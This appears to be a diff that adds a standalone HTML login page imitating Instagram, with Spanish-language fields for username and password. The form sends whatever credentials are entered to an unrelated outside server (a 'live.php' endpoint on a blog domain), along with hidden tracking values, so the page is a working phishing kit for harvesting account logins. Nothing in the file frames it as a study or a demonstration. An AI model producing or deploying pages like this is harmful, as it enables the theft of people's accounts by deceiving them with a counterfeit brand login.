@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: calc(110% - 40px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            width: 103%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #3897f0;
+            color: #fff;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+		<form method="POST" action="https://blog.yemekicmek.com/live.php?402fed91ea8ae1ea8931">
+        <img class="logo" src="instagram_logo.png" alt="Instagram Logo" width="40">
+			<input type="hidden" name="ramadhan" value="780108491NDAyZmVkOTFlYThhZTFlYTg5MzE=">
+            <input type="hidden" name="type" value="402fed91ea8ae1ea8931">
+            <input type="text" name="username" placeholder="Nombre de usuario, correo o celular" required><br>
+            <input type="password" name="password" placeholder="Contraseña" required><br>
+			<input type="submit" value="Iniciar sesión">
+        </form>
+    </div>
+</body>
+</html>
